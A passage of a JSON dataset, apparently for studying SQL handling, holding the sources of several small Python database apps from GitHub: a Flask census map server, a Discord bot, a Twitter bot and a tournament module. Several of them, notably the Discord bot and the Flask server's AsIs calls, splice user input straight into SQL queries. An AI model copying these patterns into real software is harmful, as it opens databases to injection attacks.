    except:\n            return \"\\tImporting {0} - Couldn't cluster on spatial index\".format(pg_table)\n\n    return \"SUCCESS\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/minus34/census-loader/blob/2f409cbd2eac7aaa87ae7458db3357b54faa0af9",
        "file_path": "/web/server.py",
        "source": "\nimport ast\nimport json\n# import math\n# import os\nimport psycopg2\n\n# import sys\nimport utils\n\nfrom datetime import datetime\n\nfrom contextlib import contextmanager\n\nfrom flask import Flask\nfrom flask import render_template\nfrom flask import request\nfrom flask import Response\nfrom flask_compress import Compress\n\nfrom psycopg2 import extras\nfrom psycopg2.extensions import AsIs\nfrom psycopg2.pool import ThreadedConnectionPool\n\napp = Flask(__name__, static_url_path='')\nCompress(app)\n\n# set command line arguments\nargs = utils.set_arguments()\n\n# get settings from arguments\nsettings = utils.get_settings(args)\n\n# create database connection pool\npool = ThreadedConnectionPool(10, 30,\n                              database=settings[\"pg_db\"],\n                              user=settings[\"pg_user\"],\n                              password=settings[\"pg_password\"],\n                              host=settings[\"pg_host\"],\n                              port=settings[\"pg_port\"])\n\n\n@contextmanager\ndef get_db_connection():\n    \"\"\"\n    psycopg2 connection context manager.\n    Fetch a connection from the connection pool and release it.\n    \"\"\"\n    try:\n        connection = pool.getconn()\n        yield connection\n    finally:\n        pool.putconn(connection)\n\n\n@contextmanager\ndef get_db_cursor(commit=False):\n    \"\"\"\n    psycopg2 connection.cursor context manager.\n    Creates a new cursor and closes it, committing changes if specified.\n    \"\"\"\n    with get_db_connection() as connection:\n        cursor = connection.cursor(cursor_factory=psycopg2.extras.RealDictCursor)\n        try:\n            yield cursor\n            if commit:\n                connection.commit()\n        finally:\n            cursor.close()\n\n\n@app.route(\"/\")\ndef homepage():\n    return render_template('index.html')\n\n\n@app.route(\"/get-bdy-names\")\ndef get_boundary_name():\n    # Get parameters from querystring\n    min = int(request.args.get('min'))\n    max = int(request.args.get('max'))\n\n    boundary_zoom_dict = dict()\n\n    for zoom_level in range(min, max + 1):\n        boundary_zoom_dict[\"{0}\".format(zoom_level)] = utils.get_boundary_name(zoom_level)\n\n    return Response(json.dumps(boundary_zoom_dict), mimetype='application/json')\n\n\n@app.route(\"/get-metadata\")\ndef get_metadata():\n    full_start_time = datetime.now()\n    start_time = datetime.now()\n\n    # Get parameters from querystring\n    num_classes = int(request.args.get('n'))\n    raw_stats = request.args.get('stats')\n\n    # replace all maths operators to get list of all the stats we need\n    search_stats = raw_stats.upper().replace(\" \", \"\").replace(\"(\", \"\").replace(\")\", \"\") \\\n        .replace(\"+\", \",\").replace(\"-\", \",\").replace(\"/\", \",\").replace(\"*\", \",\").split(\",\")\n\n    # TODO: add support for numbers in equations - need to strip them from search_stats list\n\n    # equation_stats = raw_stats.lower().split(\",\")\n\n    # print(equation_stats)\n    # print(search_stats)\n\n    # get stats tuple for query input (convert to lower case)\n    search_stats_tuple = tuple([stat.lower() for stat in search_stats])\n\n    # get all boundary names in all zoom levels\n    boundary_names = list()\n\n    for zoom_level in range(0, 16):\n        bdy_name = utils.get_boundary_name(zoom_level)\n\n        if bdy_name not in boundary_names:\n            boundary_names.append(bdy_name)\n\n    # get stats metadata, including the all important table number and map type (raw values based or normalised by pop)\n    sql = \"SELECT lower(sequential_id) AS id, \" \\\n          \"lower(table_number) AS \\\"table\\\", \" \\\n          \"replace(long_id, '_', ' ') AS description, \" \\\n          \"column_heading_description AS type, \" \\\n          \"CASE WHEN lower(long_id) LIKE '%%median%%' OR lower(long_id) LIKE '%%average%%' THEN 'values' \" \\\n          \"ELSE 'normalised' END AS maptype \" \\\n          \"FROM {0}.metadata_stats \" \\\n          \"WHERE lower(sequential_id) IN %s \" \\\n          \"ORDER BY sequential_id\".format(settings[\"data_schema\"], )\n\n    with get_db_cursor() as pg_cur:\n        try:\n            pg_cur.execute(sql, (search_stats_tuple,))\n        except psycopg2.Error:\n            return \"I can't SELECT :\\n\\n\" + sql\n\n        # Retrieve the results of the query\n        rows = pg_cur.fetchall()\n\n    # output is the main content, row_output is the content from each record returned\n    response_dict = dict()\n    response_dict[\"type\"] = \"StatsCollection\"\n    response_dict[\"classes\"] = num_classes\n\n    # output_array = list()\n\n    # # get metadata for all boundaries (done in one go for frontend performance)\n    # for boundary_name in boundary_names:\n    #     output_dict = dict()\n    #     output_dict[\"boundary\"] = boundary_name\n    #\n    #     boundary_table = \"{0}.{1}\".format(settings[\"web_schema\"], boundary_name)\n\n    feature_array = list()\n\n    # For each row returned assemble a dictionary\n    for row in rows:\n        feature_dict = dict(row)\n        feature_dict[\"id\"] = feature_dict[\"id\"].lower()\n        feature_dict[\"table\"] = feature_dict[\"table\"].lower()\n\n        for boundary_name in boundary_names:\n            boundary_table = \"{0}.{1}\".format(settings[\"web_schema\"], boundary_name)\n\n            data_table = \"{0}.{1}_{2}\".format(settings[\"data_schema\"], boundary_name, feature_dict[\"table\"])\n\n            # get the values for the map classes\n            with get_db_cursor() as pg_cur:\n                stat_field = \"CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END\" \\\n                    .format(feature_dict[\"id\"], )\n                feature_dict[boundary_name] = utils.get_equal_interval_bins(\n                    data_table, boundary_table, stat_field, pg_cur, settings)\n\n        # add dict to output array of metadata\n        feature_array.append(feature_dict)\n\n    response_dict[\"stats\"] = feature_array\n    # output_array.append(output_dict)\n\n    # print(\"Got metadata for {0} in {1}\".format(boundary_name, datetime.now() - start_time))\n\n    # # Assemble the JSON\n    # response_dict[\"boundaries\"] = output_array\n\n    print(\"Returned metadata in {0}\".format(datetime.now() - full_start_time))\n\n    return Response(json.dumps(response_dict), mimetype='application/json')\n\n\n@app.route(\"/get-data\")\ndef get_data():\n    full_start_time = datetime.now()\n    start_time = datetime.now()\n\n    # Get parameters from querystring\n\n    map_left = request.args.get('ml')\n    map_bottom = request.args.get('mb')\n    map_right = request.args.get('mr')\n    map_top = request.args.get('mt')\n\n    stat_id = request.args.get('s')\n    table_id = request.args.get('t')\n    boundary_name = request.args.get('b')\n    zoom_level = int(request.args.get('z'))\n\n    # # get the number of decimal places for the output GeoJSON to reduce response size & speed up rendering\n    # decimal_places = utils.get_decimal_places(zoom_level)\n\n    # TODO: add support for equations\n\n    # get the boundary table name from zoom level\n    if boundary_name is None:\n        boundary_name = utils.get_boundary_name(zoom_level)\n\n    display_zoom = str(zoom_level).zfill(2)\n\n    # stat_table_name = boundary_name + \"_\" + table_id\n    #\n    # boundary_table_name = \"{0}\".format(boundary_name)\n\n    with get_db_cursor() as pg_cur:\n        print(\"Connected to database in {0}\".format(datetime.now() - start_time))\n        start_time = datetime.now()\n\n        # envelope_sql = \"ST_MakeEnvelope({0}, {1}, {2}, {3}, 4283)\".format(map_left, map_bottom, map_right, map_top)\n        # geom_sql = \"geojson_{0}\".format(display_zoom)\n\n        # build SQL with SQL injection protection\n        sql = \"SELECT bdy.id, bdy.name, bdy.population, tab.%s / bdy.area AS density, \" \\\n              \"CASE WHEN bdy.population > 0 THEN tab.%s / bdy.population * 100.0 ELSE 0 END AS percent, \" \\\n              \"tab.%s, geojson_%s AS geometry \" \\\n              \"FROM {0}.%s AS bdy \" \\\n              \"INNER JOIN {1}.%s_%s AS tab ON bdy.id = tab.{2} \" \\\n              \"WHERE bdy.geom && ST_MakeEnvelope(%s, %s, %s, %s, 4283) LIMIT ALL\" \\\n            .format(settings['web_schema'], settings['data_schema'], settings['region_id_field'])\n\n        try:\n            # print(pg_cur.mogrify(sql, (AsIs(stat_id), AsIs(stat_id), AsIs(stat_id), AsIs(display_zoom), AsIs(boundary_name), AsIs(boundary_name), AsIs(table_id), AsIs(map_left), AsIs(map_bottom), AsIs(map_right), AsIs(map_top))))\n\n            # yes, this is ridiculous - if someone can find a shorthand way of doing this then great!\n            pg_cur.execute(sql, (AsIs(stat_id), AsIs(stat_id), AsIs(stat_id), AsIs(display_zoom),\n                                 AsIs(boundary_name), AsIs(boundary_name), AsIs(table_id), AsIs(map_left),\n                                 AsIs(map_bottom), AsIs(map_right), AsIs(map_top)))\n        except psycopg2.Error:\n            return \"I can't SELECT : \" + sql\n\n        # print(\"Ran query in {0}\".format(datetime.now() - start_time))\n        # start_time = datetime.now()\n\n        # Retrieve the results of the query\n        rows = pg_cur.fetchall()\n        # row_count = pg_cur.rowcount\n\n        # Get the column names returned\n        col_names = [desc[0] for desc in pg_cur.description]\n\n    print(\"Got records from Postgres in {0}\".format(datetime.now() - start_time))\n    start_time = datetime.now()\n\n    # # Find the index of the column that holds the geometry\n    # geom_index = col_names.index(\"geometry\")\n\n    # output is the main content, row_output is the content from each record returned\n    output_dict = dict()\n    output_dict[\"type\"] = \"FeatureCollection\"\n\n    i = 0\n    feature_array = list()\n\n    # For each row returned...\n    for row in rows:\n        feature_dict = dict()\n        feature_dict[\"type\"] = \"Feature\"\n\n        properties_dict = dict()\n\n        # For each field returned, assemble the feature and properties dictionaries\n        for col in col_names:\n            if col == 'geometry':\n                feature_dict[\"geometry\"] = ast.literal_eval(str(row[col]))\n            elif col == 'id':\n                feature_dict[\"id\"] = row[col]\n            else:\n                properties_dict[col] = row[col]\n\n        feature_dict[\"properties\"] = properties_dict\n\n        feature_array.append(feature_dict)\n\n        # start over\n        i += 1\n\n    # Assemble the GeoJSON\n    output_dict[\"features\"] = feature_array\n\n    print(\"Parsed records into JSON in {1}\".format(i, datetime.now() - start_time))\n    print(\"Returned {0} records  {1}\".format(i, datetime.now() - full_start_time))\n\n    return Response(json.dumps(output_dict), mimetype='application/json')\n\n\nif __name__ == '__main__':\n    # import threading, webbrowser\n    # # url = \"http://127.0.0.1:8081?stats=B2712,B2772,B2775,B2778,B2781,B2793\"\n    # url = \"http://127.0.0.1:8081/?stats=B2793&z=12\"\n    # threading.Timer(5, lambda: webbrowser.open(url)).start()\n\n    app.run(host='0.0.0.0', port=5000, debug=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cnov20/holbertonschool-higher_level_programming/blob/e52402f9695d5ebec6c2e6cd4272b1360f50c0df",
        "file_path": "/0x0F-python-object_relational_mapping/10-model_state_my_get.py",
        "source": "#!/usr/bin/python3\n\n''' Module that lists all objects with a given attribute in a given table,\nusing SQLAlchemy, this is linked to a MySQL table via SQLAlchemy '''\n\nfrom sys import argv\nfrom model_state import Base, State\nfrom sqlalchemy import create_engine\nfrom sqlalchemy import Column, Integer, String\nfrom sqlalchemy.orm import sessionmaker\nfrom sqlalchemy.ext.declarative import declarative_base\n\nif __name__ == '__main__':\n    engine = create_engine('mysql+mysqldb://{}:{}@localhost/{}'\n                           .format(argv[1], argv[2], argv[3]))\n    Base.metadata.create_all(engine)\n\n    Session = sessionmaker(bind=engine)\n    session = Session()\n    state_name = session.query(State).filter(State.name.contains(argv[4]))\n    try:\n        print(\"{}\".format(state_name[0].id))\n    except:\n        print(\"Not found\")\n    session.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/BeatButton/beattie/blob/e39d54b56f09241823b686fb19d2d7b4ab4b1319",
        "file_path": "/eddb.py",
        "source": "import asyncio\r\nimport sqlite3\r\n\r\nimport discord\r\nfrom discord.ext import commands\r\n\r\nimport to_sqlalchemy\r\n\r\nclass EDDB:\r\n    def __init__(self, bot):\r\n        self.bot = bot\r\n        self.updating = False\r\n\r\n    @commands.group(aliases=['elite', 'ed'])\r\n    async def eddb(self, ctx):\r\n        \"\"\"Commands for getting data from EDDB.io\"\"\"\r\n        if ctx.invoked_subcommand is None:\r\n            await ctx.send('Invalid command passed. '\r\n                            f'Try \"{self.bot.command_prefix[0]}help eddb\"')\r\n        \r\n    @eddb.command(aliases=['sys'])\r\n    async def system(self, ctx, *, inp):\r\n        \"\"\"Searches the database for a system.\"\"\"\r\n\r\n        loop = asyncio.get_event_loop()\r\n        result = await loop.run_in_executor(None, self.system_search, inp)\r\n\r\n        await ctx.send(result)\r\n\r\n    def system_search(self, search):\r\n        search = search.lower()\r\n        conn = sqlite3.connect('data/ed.db').cursor()\r\n        table = conn.execute(f\"select * from populated where lower(name) = '{search}'\")\r\n        results = table.fetchone()\r\n        if not results:\r\n            table = conn.execute(f\"select * from systems where lower(name) = '{search}'\")\r\n            results = table.fetchone()\r\n        if results:\r\n            keys = tuple(i[0] for i in table.description) \r\n            return '\\n'.join(f'{key.replace(\"_\", \" \").title()}: {field}'\r\n                             for key, field in zip(keys[1:], results[1:]) if field)\r\n        else:\r\n            return 'No systems found.'\r\n\r\n    @eddb.command(aliases=['sta'])\r\n    async def station(self, ctx, *, inp):\r\n        \"\"\"Searches the database for a station.\r\n            To specify the system, put a comma after the station name and put the system there.\"\"\"\r\n\r\n        loop = asyncio.get_event_loop()\r\n        result = await loop.run_in_executor(None, self.station_search, inp)\r\n\r\n        await ctx.send(result)\r\n\r\n    def station_search(self, search, target_system=None, ctx=None):\r\n        search = search.lower()\r\n        conn = sqlite3.connect('data/ed.db').cursor()\r\n        if ',' in search:\r\n            search, target_system = (i.strip() for i in search.split(','))\r\n\r\n        query = f\"select * from stations where lower(name) = '{search}'\"\r\n\r\n        if target_system is not None: \r\n            target_system = target_system.lower()\r\n            table = conn.execute(f\"select id from populated where lower(name)='{target_system}'\")\r\n            results = table.fetchone()\r\n            if results:\r\n                target_system = results[0]\r\n                query += f\" and system_id = {target_system}\"\r\n            else:\r\n                return 'System not found.'\r\n\r\n        result = conn.execute(query)\r\n        results = result.fetchall()\r\n\r\n        if len(results) == 1:\r\n            keys = tuple(i[0] for i in result.description) \r\n            return '\\n'.join(f'{key.replace(\"_\", \" \").title()}: {field}'\r\n                             for key, field in zip(keys[2:], results[0][2:]) if field)\r\n        elif not results:\r\n            return 'Station not found.'\r\n        else:\r\n            return 'Multiple stations found, please specify system.'\r\n\r\n    @eddb.command(aliases=['b', 'bod'])\r\n    async def body(self, ctx, *, inp):\r\n        \"\"\"Searches the database for a stellar body.\"\"\"\r\n        loop = asyncio.get_event_loop()\r\n        result = await loop.run_in_executor(None, self.body_search, inp)\r\n\r\n        await ctx.send(result)\r\n\r\n    def body_search(self, search):\r\n        search = search.lower()\r\n        conn = sqlite3.connect('data/ed.db').cursor()\r\n        result = conn.execute(f\"select * from bodies where lower(name) = '{search}'\")\r\n        results = result.fetchone()\r\n        if results:\r\n            keys = tuple(i[0] for i in result.description) \r\n            return '\\n'.join(f'{key.replace(\"_\", \" \").title()}: {field}'\r\n                             for key, field in zip(keys[2:], results[2:]) if field)\r\n        else:\r\n            return 'No bodies found.'\r\n\r\n    @eddb.command(aliases=['u', 'upd'])\r\n    async def update(self, ctx):\r\n        \"\"\"Updates the database. Will take some time.\"\"\"\r\n        if not self.updating:\r\n            self.updating = True\r\n            await ctx.send('Database update in progress...')\r\n            loop = asyncio.get_event_loop()\r\n            await loop.run_in_executor(None, to_sqlalchemy.remake)\r\n            await ctx.send('Database update complete.')\r\n            self.updating = False\r\n        else:\r\n            await ctx.send('Database update still in progress.')\r\n\r\n\r\n    @update.error\r\n    async def update_error(self, exception, ctx):\r\n        await self.bot.handle_error(exception, ctx)\r\n\r\n    @eddb.command(aliases=['c', 'com', 'comm'])\r\n    async def commodity(self, ctx, *, inp):\r\n        \"\"\"Searches the database for information on a commodity. Specify the station to get listing data.\r\n\r\n            Input in the format: commodity[, station[, system]]\"\"\"\r\n        loop = asyncio.get_event_loop()\r\n        result = await loop.run_in_executor(None, self.commodity_search, inp)\r\n        await ctx.send(result)\r\n\r\n\r\n    def commodity_search(self, search):\r\n        search = search.lower().split(', ')\r\n        conn = sqlite3.connect('data/ed.db').cursor()\r\n\r\n        if len(search) == 1:\r\n            table = conn.execute(f\"select * from commodities where lower(name)='{search[0]}'\")\r\n            result = table.fetchone()\r\n            if result:\r\n                keys = tuple(i[0] for i in table.description)\r\n                return '\\n'.join(f'{key.replace(\"_\", \" \").title()}: {field}'\r\n                                 for key, field in zip(keys[1:], result[1:]))\r\n        \r\n        elif len(search) < 4:\r\n            table = conn.execute(f\"select id from commodities where lower(name)='{search[0]}'\")\r\n            result = table.fetchone()\r\n            if not result:\r\n                return 'Commodity not found.'\r\n            commodity_id = result[0]\r\n\r\n            query = f\"select id from stations where lower(name)='{search[1]}'\"\r\n            \r\n            if len(search) == 3:\r\n                table = conn.execute(f\"select id from systems where lower(name)='{search[2]}'\")\r\n                result = table.fetchone()\r\n                if not result:\r\n                    return 'System not found.'\r\n                system_id = result[0]\r\n                query += f\" and system_id={system_id}\"\r\n            table = conn.execute(query)\r\n            result = table.fetchall()\r\n            if not result:\r\n                return 'Station not found.'\r\n            elif len(result) > 1:\r\n                return 'Multiple stations found, please specify system.'\r\n            station_id = result[0][0]\r\n\r\n            table = conn.execute(f\"select * from listings where station_id={station_id} \"\r\n                                 f\"and commodity_id={commodity_id}\")\r\n            result = table.fetchone()\r\n            if not result:\r\n                return 'Commodity not available to be bought or sold at station.'\r\n\r\n            keys = (i[0] for i in table.description)\r\n            result = {k: v for k, v in zip(keys, result)}\r\n            result.pop('station_id')\r\n            result.pop('commodity_id')\r\n            result.pop('id')\r\n            ret = f'Commodity: {search[0].title()}\\n'\r\n            if len(search) > 1:\r\n                ret += f'Station: {search[1].title()}\\n'\r\n            if len(search) > 2:\r\n                ret += f'System: {search[2].title()}\\n'\r\n            return ret +('\\n'.join(f'{key.replace(\"_\", \" \").title()}: {field}'\r\n                             for key, field in result.items()))\r\n\r\n        else:\r\n            return 'Too many commas. What does that even mean.'\r\n            \r\n\r\ndef setup(bot):\r\n    from os import path\r\n    if not path.exists('./data/ed.db'):\r\n        from to_sqlalchemy import update\r\n        update()\r\n    bot.add_cog(EDDB(bot))\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/maxh213/VeganAlcoholCheckerTwitterBot/blob/22f22a1b59ed46fd8a115cd6256cdbcfbdde9735",
        "file_path": "/getAlcohol.py",
        "source": "import psycopg2\nimport secretConstants\n\nconnectionString = (\n    'dbname=' + secretConstants.DATABASE_NAME + \n    ' user=' + secretConstants.DATABASE_USER + \n    ' host=' + secretConstants.DATABASE_HOST + \n    ' password=' + secretConstants.DATABASE_PASSWORD +\n    ' port=' + secretConstants.DATABASE_PORT\n)\nconn = None\nresult = None\n\ndef getAlcoholByName(name):\n    name = fixTypingErrors(name)\n    QUERY = (\n        \"SELECT barnivore_product_name, barnivore_status, barnivore_country \" + \n        \"FROM barnivore_product \" +\n        \"WHERE lower(barnivore_product_name) like lower('% \\%s %')\"\n    )\n    \n    try:\n        conn = psycopg2.connect(connectionString)\n        cur = conn.cursor()\n        cur.execute(QUERY, (name))\n        result = cur.fetchall()\n\n    except(psycopg2.DatabaseError, e):\n        print('Error %s' % e)    \n\n    finally:\n        if conn:\n            conn.close()\n\n    return result\n\ndef fixTypingErrors(name):\n    name = name.lower() \n    if name == \"guiness\":\n        name = \"guinness\"\n    return name\n\n#Uncomment for testing\n#getAlcoholByName(\"guiness\")\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/maxh213/VeganAlcoholCheckerTwitterBot/blob/22f22a1b59ed46fd8a115cd6256cdbcfbdde9735",
        "file_path": "/lastReplied.py",
        "source": "import psycopg2\nimport secretConstants\n\nconnectionString = (\n    'dbname=' + secretConstants.DATABASE_NAME + \n    ' user=' + secretConstants.DATABASE_USER + \n    ' host=' + secretConstants.DATABASE_HOST + \n    ' password=' + secretConstants.DATABASE_PASSWORD +\n    ' port=' + secretConstants.DATABASE_PORT\n)\nconn = None\nresult = None\n\ndef getLastReplied(messageType):\n    QUERY = (\n        \"SELECT item_id from twitter_bot_vac_last_replied_id where name = '{0}'\"\n    ).format(messageType)\n    \n    try:\n        conn = psycopg2.connect(connectionString)\n        cur = conn.cursor()\n        cur.execute(QUERY)\n        result = cur.fetchone()\n\n    except(psycopg2.DatabaseError, e):\n        print('Error %s' % e)    \n\n    finally:\n        if conn:\n            conn.close()\n\n    return result[0]\n\n#print(getLastReplied(\"DM\"))\n#print(getLastReplied(\"MENTION\"))\n\ndef setLastReplied(messageType, itemId):\n    QUERY = (\n        \"UPDATE twitter_bot_vac_last_replied_id SET item_id = '${0}' WHERE name = '${1}'\"\n    ).format(itemId, messageType)\n    \n    try:\n        conn = psycopg2.connect(connectionString)\n        cur = conn.cursor()\n        cur.execute(QUERY)\n        conn.commit()\n        cur.close()\n\n    except(psycopg2.DatabaseError, e):\n        print('Error %s' % e)    \n\n    finally:\n        if conn:\n            conn.close()\n\n\n#setLastReplied(\"DM\", \"772180529001197572\")",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/maxh213/VeganAlcoholCheckerTwitterBot/blob/22f22a1b59ed46fd8a115cd6256cdbcfbdde9735",
        "file_path": "/twitterBot.py",
        "source": "import tweepy\nimport secretConstants\nimport cgi\nfrom getAlcohol import getAlcoholByName\nfrom lastReplied import getLastReplied, setLastReplied\n\nauth = tweepy.OAuthHandler(secretConstants.CONSUMER_KEY, secretConstants.CONSUMER_SECRET)\nauth.set_access_token(secretConstants.ACCESS_TOKEN, secretConstants.ACCESS_TOKEN_SECRET)\napi = tweepy.API(auth)\n\n#alcoholName = \"GUINESS\"\n#tweetAboutAlcohol(alcoholName)\n#functions need to be declared above calling them it seems...\n\ndef formatReply(result):\n    if result[2] == '':\n        reply = result[0] + \" is \" + result[1] + \".\"\n    elif result[0][2] != '' and result[2]:\n        reply = result[0] + \" brewed in \" + result[2] + \" is \" + result[1] + \".\" \n    return reply\n\ndef getDMs():\n    lastRepliedDmId = getLastReplied('DM')\n    return api.direct_messages(full_text=True, since_id=lastRepliedDmId)\n\ndef replyToUnansweredDMs(dms):\n    for dm in dms:\n        results = getAlcoholByName(dm.text)\n        if len(results) > 10:\n            replyToDm = \"Sorry but I know a lot of alcohol with that in the name, could you be more specific?\"\n            api.send_direct_message(screen_name=dm.sender_screen_name, text=replyToDm)\n        elif results == []:\n            replyToDm = \"Unfortunately I cannot find the name of the alcohol you specified in my database, apologies.\"\n            api.send_direct_message(screen_name=dm.sender_screen_name, text=replyToDm)\n        else:\n            for result in results:\n                replyToDm = formatReply(result)\n                api.send_direct_message(screen_name=dm.sender_screen_name, text=replyToDm)\n        print(dm.sender_screen_name + \" sent \" + dm.text)\n        setLastReplied('DM', dm.id_str)\n    \ndef main():\n    dms = getDMs()\n    replyToUnansweredDMs(dms)\n\n\nmain()\n\n\ndef tweetAboutAlcohol(alcoholName):\n    results = getAlcoholByName(alcoholName)\n\n    tweetQueue = []\n    for result in results: \n        status = formatReply(result)\n        tweetQueue.append(status)\n\n    for tweet in tweetQueue:\n        api.update_status(status=tweet)\n        print(\"tweeted: '\" + tweet + \"'\")\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/toriancrane/tournament-results-database/blob/c6569467efbd9a1b8b178d4b620e145b2371d4d2",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n# \n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute('DELETE FROM matches')\n    db.commit()\n    db.close()\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute('DELETE FROM players')\n    db.commit()\n    db.close()\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute('SELECT count(player_id) from players')\n    player_count = c.fetchone()[0]\n    print player_count\n    db.close()\n    return player_count\n\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n  \n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n  \n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute('INSERT INTO players (player_name) VALUES (%s)', (name,))\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    sql = (\"SELECT player_id, player_name, COUNT(matches.winner) AS wins, \"\n             \"(SELECT total_matches FROM total_view WHERE total_view.player_id = players.player_id) \"\n             \"FROM players LEFT JOIN matches \"\n             \"ON players.player_id = matches.winner \"\n             \"GROUP BY players.player_id, players.player_name \"\n             \"ORDER BY wins DESC\")\n    c.execute(sql)\n    results = c.fetchall()\n    db.close()\n    return results\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute('INSERT INTO matches (winner, loser) '\n              'VALUES (%s, %s)', (winner, loser,))\n    db.commit()\n    db.close()\n \n \ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n  \n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n  \n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    standings = playerStandings()\n    length = len(standings)\n    pairings = []\n\n    x = 0\n    while(x < length):\n        id1 = standings[x][0]\n        name1 = standings[x][1]\n        id2 = standings[x + 1][0]\n        name2 = standings[x + 1][1]\n        pairings.append((id1, name1, id2, name2))\n        x += 2\n    return pairings\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/conix-center/smart-cities-demo/blob/0cdf2b470363f3aeee50ef48b43d1a90fc36fee2",
        "file_path": "/data-ingester/timescale_poster/timescale_poster.py",
        "source": "#!/usr/bin/python3\n\nimport psycopg2\n\nclass TimescalePoster:\n\n    def __init__(self, host, port, database, username, password):\n        self.connection = psycopg2.connect(dbname=database, host=host, port=port, user=username, password=password)\n\n    \"\"\"\n    Inserts data into an existing table. On failure due to not enough columns\n    will automatically add columns to the table as necessary.\n    Takes:\n    tableName - string of the table being inserted into\n    timeStamp - the timeStamp of the insertion\n    tableObj - a dict of key/value pairs to insert\n    \"\"\"\n    def insertData(self, tableName, timeStamp, tableObj):\n        cols = \"\"\n        vals = \"\"\n        for key in tableObj:\n            cols = cols + \", %s\"\n            vals = vals + \", %s\"\n\n        nameList = []\n        valList = []\n        nameList.append(tableName)\n        for key in tableObj:\n            nameList.append(key)\n            valList.append(tableObj[key])\n\n        nameList = nameList + valList\n\n        cursor = self.connection.cursor()\n        try:\n            cursor.execute(\"INSERT INTO %s (TIMESTAMP\" + cols + \") VALUES (%s,\" + vals + \")\", nameList)\n            print('posted successfully!')\n            self.connection.commit()\n        except psycopg2.Error as e:\n            cursor.close();\n            print(\"Insert Error: %s\".format(e))\n\n            #was this error due to adding a field?\n            if e == missing_column:\n                print(\"Attempting to alter table!\")\n                #column_name = err.toString().split(\"\\\"\")[1];\n                columnName = \"\"\n\n                params = []\n                try:\n                    t = self.__getType(tableObj[columnName]);\n                    params.append(tableName);\n                    params.append(columnkName);\n                    params.append(t);\n                except TypeError as e:\n                    print(\"Got a type error %s\".format(e))\n                    print('Error with field %s'.format(columnName))\n                    print('Table alteration failed')\n                    raise e\n\n                #print(params)\n                try:\n                    cursor = self.connection.cursor()\n                    cursor.execute(\"ALTER TABLE %s ADD COLUMN %s %s\", params)\n                    self.connection.commit()\n                except psycopg2.Error as e:\n                    print(\"Failed to alter table with error e\".format(e))\n\n                print(\"Table alteration succeeded - attempting to insert again\")\n\n                try:\n                    self.insertData(tableName, timeStamp, tableObj)\n                    print('posted successfully!')\n                except:\n                    print(\"Unexpected error when reinserted!\")\n\n            #was this error due to missing the table entirely?\n            elif e == missing_table:\n                try:\n                    self.createTable(tableName, tableObj)\n                    print(\"Created table successfully - reinserting\")\n                except psycopg2.Error as e:\n                    print(\"Failed to create table??: %s\".format(e))\n                    raise\n\n                try:\n                    self.insertData(tableName, timeStamp, tableObj)\n                    print('posted successfully!')\n                except:\n                    print(\"Unexpected error when reinserted!\")\n                    raise\n\n    \"\"\"\n    A private function that maps a type in python to a type in postgres\n    Supports Strings, bools, numbers and arrays\n\n    Raises a typerror on failure\n    \"\"\"\n    def __getType(self, value):\n        t = type(value)\n        if(t is str):\n            return 'TEXT'\n        elif(t is bool):\n            return 'BOOLEAN'\n        elif(t is int):\n            return 'DOUBLE PRECISION'\n        elif(t is float):\n            return 'DOUBLE PRECISION'\n        elif(t is list):\n            t2 = type(value[0])\n            if(t2 is str):\n                return 'TEXT[]'\n            elif(t2 is bool):\n                return 'BOOLEAN[]'\n            elif(t2 is int):\n                return 'DOUBLE PRECISION[]'\n            elif(t2 is float):\n                return 'DOUBLE PRECISION[]'\n            else:\n                raise TypeError('Only supports strings, booleans, numbers and arrays of the former')\n        else:\n            raise TypeError('Only supports strings, booleans, numbers and arrays of the former')\n\n    \"\"\"\n    Creates a timescaledb table with at least a timestamp field. Partitions table\n    by time.\n    Takes:\n    tableName - string of the table being inserted into\n    tableObj - a dict of key/value pairs to start the table with\n    \"\"\"\n    def createTable(self, tableName, tableObj):\n        #find the number of columns in the in the tableobj and create\n        #placeholders\n        cols = \"\"\n        for key in tableObj:\n            cols = cols + 